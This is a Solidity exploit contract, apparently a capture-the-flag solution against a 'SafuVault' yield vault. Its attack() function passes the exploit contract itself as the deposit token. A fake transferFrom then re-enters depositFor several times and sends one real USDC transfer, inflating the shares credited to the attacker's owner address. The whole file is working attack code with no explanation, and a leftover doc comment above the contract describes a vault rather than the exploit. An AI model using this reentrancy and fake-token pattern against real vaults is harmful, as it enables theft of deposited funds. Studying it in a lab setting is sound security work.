// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "./SafuVault.sol";
import "forge-std/console.sol";
/// @dev safu yield vault with automated strategy
contract Exploit {

    // using SafeERC20 for IERC20;
    address public safuVault;
    address public usdc;
    address public owner;
    uint256 public count;
    bool public once;
    constructor (address _safuVault, address _usdc) public {
        safuVault = _safuVault;
        usdc = _usdc;
        owner = msg.sender;
    }

    function attack() public {
        IERC20(usdc).approve(safuVault, type(uint256).max);
        SafuVault(safuVault).depositFor(address(this), 10_000e18, owner);
    }

    function transferFrom(
        address from, 
        address to, 
        uint256 amount
    ) external {
        if(count<4){
            count++;
            SafuVault(safuVault).depositFor(address(this), 10_000e18, owner);
        }

        if(!once){
            IERC20(usdc).transfer(address(safuVault), 10_000e18);
            once = true;
        } 
    }
}
